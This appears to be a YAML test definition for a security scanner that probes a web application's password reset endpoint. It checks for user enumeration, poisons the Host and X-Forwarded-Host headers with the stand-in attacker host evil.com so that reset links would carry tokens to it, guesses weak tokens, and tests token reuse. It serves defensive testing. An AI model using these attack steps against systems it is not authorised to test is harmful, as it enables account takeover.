name: password_reset_abuse
description: Test password reset functionality for vulnerabilities

variables:
  email: "test@example.com"
  victim_email: "victim@example.com"

steps:
  - name: request_reset
    request:
      method: POST
      url: /api/password/reset
      json:
        email: "${email}"
    extract:
      message: $.message
    expect:
      status: [200, 201, 202]

  - name: check_email_enumeration
    request:
      method: POST
      url: /api/password/reset
      json:
        email: "nonexistent_user_12345@example.com"
    extract:
      invalid_message: $.message
    expect:
      status: [200, 400, 404]

  - name: submit_token
    request:
      method: POST
      url: /api/password/reset/confirm
      json:
        token: "${reset_token}"
        new_password: "NewPass123!"
    expect:
      status: 200
    optional: true

attacks:
  - name: user_enumeration
    description: Check if responses differ for valid vs invalid emails
    type: information_disclosure
    verify:
      - request:
          method: POST
          url: /api/password/reset
          json:
            email: "admin@example.com"
        expect:
          body_not_contains: "User not found"

  - name: host_header_poison
    description: Manipulate Host header to poison reset link
    type: host_header_injection
    modify_step: request_reset
    modifications:
      headers.Host: "evil.com"
      headers.X-Forwarded-Host: "evil.com"

  - name: token_bruteforce
    description: Test for weak/predictable reset tokens
    type: weak_token
    sequence:
      - run: [request_reset]
      - request:
          method: POST
          url: /api/password/reset/confirm
          json:
            token: "000000"
            new_password: "Test123!"
      - request:
          method: POST
          url: /api/password/reset/confirm
          json:
            token: "123456"
            new_password: "Test123!"

  - name: token_reuse
    description: Check if old tokens still work
    type: token_reuse
    sequence:
      - run: [request_reset]
      - extract: {first_token: reset_token}
      - run: [request_reset]
      - request:
          method: POST
          url: /api/password/reset/confirm
          json:
            token: "${first_token}"
            new_password: "Test123!"
